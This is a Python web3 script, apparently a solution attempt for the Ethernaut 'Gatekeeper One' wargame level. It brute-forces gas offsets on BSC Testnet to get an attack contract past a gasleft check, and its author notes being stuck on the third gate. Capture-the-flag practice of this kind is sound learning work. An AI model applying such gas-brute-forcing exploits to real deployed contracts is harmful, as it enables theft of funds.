# The objective here is to get through the gate by passing 3 checks. The last check is to 
# generate a key that pass 3 conversion checks between a lot of type casting. For the gasLeft
# gate I deployed a copy of the original contract but with more revert messages, to make it
# easier to understand where I was getting stuck. Then I proceed to brute force the gas amount
# until I found a range of working values. I'm stuck at gate three at the moment.

from web3 import Web3, middleware
from web3.middleware import construct_sign_and_send_raw_middleware
from web3.middleware import geth_poa_middleware # Needed for BSC

# Util library to work with private keys and address
from eth_account import Account

# Library to read the JSONs that contains the contract ABI
import json

# Setting up the account to sign transactions.
main_account = Account.from_key("") #TODO: Include main operator PK
print("Main wallet: " + main_account.address)

# Setting up the provider. For this solution I had to use BSC Testnet
w3Provider = Web3(Web3.HTTPProvider("https://data-seed-prebsc-1-s1.binance.org:8545"))
w3Provider.middleware_onion.inject(geth_poa_middleware, layer=0) # needed for BSC
w3Provider.middleware_onion.add(construct_sign_and_send_raw_middleware(main_account))
w3Provider.eth.default_account = main_account.address

# Gas strategy is a parameter necessary for BSC Testnet
def gas_price_strategy(web3, transaction_params):
    return Web3.toWei(10, 'gwei')

w3Provider.eth.set_gas_price_strategy(gas_price_strategy)
w3Provider.middleware_onion.add(middleware.time_based_cache_middleware)

victimAddress = ""

# We proceed to instantiate the attacking contract
buildFile = open('artifacts/contracts/GatekeeperOneAttack.sol/GatekeeperOneAttack.json', "r")
build = json.loads(buildFile.read())
attackContract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed contract address

# We proceed to instantiate the victim contract
#buildFile = open('../contracts/build/contracts/levels/Privacy.sol/Privacy.json', "r")
#build = json.loads(buildFile.read())
#victimContract = w3Provider.eth.contract(address='0x41EBD6efac13Ebb818C825332593e3D585bDA0Bc', abi=build['abi']) #TODO: Include deployed contract address

# Send the password to the contract
for i in range(420, 640):
    try:
        transaction = attackContract.functions.attackGates(8191*10 + i).call()
        print(w3Provider.eth.wait_for_transaction_receipt(transaction))
        break
    except Exception as err:
        print(str(i) + ": " + str(err))